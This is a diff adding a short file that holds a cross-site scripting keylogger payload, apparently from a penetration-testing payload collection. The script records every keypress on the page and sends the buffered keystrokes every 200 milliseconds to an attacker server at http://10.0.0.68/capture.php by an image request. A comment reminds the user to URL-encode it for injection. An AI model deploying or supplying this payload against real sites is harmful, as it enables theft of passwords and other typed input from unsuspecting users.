@@ -1,0 +1,24 @@
+<!-- dont forget to URL Encode the payload -->
+<script>
+
+var buffer = [];
+var attacker = 'http://10.0.0.68/capture.php?c='
+
+document.onkeypress = function(e) {
+    var timestamp = Date.now() | 0;
+    var stroke = {
+        k: e.key,
+        t: timestamp
+    };
+    buffer.push(stroke);
+}
+
+window.setInterval(function() {
+    if (buffer.length > 0) {
+        var data = encodeURIComponent(JSON.stringify(buffer));
+        new Image().src = attacker + data;
+        buffer = [];
+    }
+}, 200);
+
+</script>
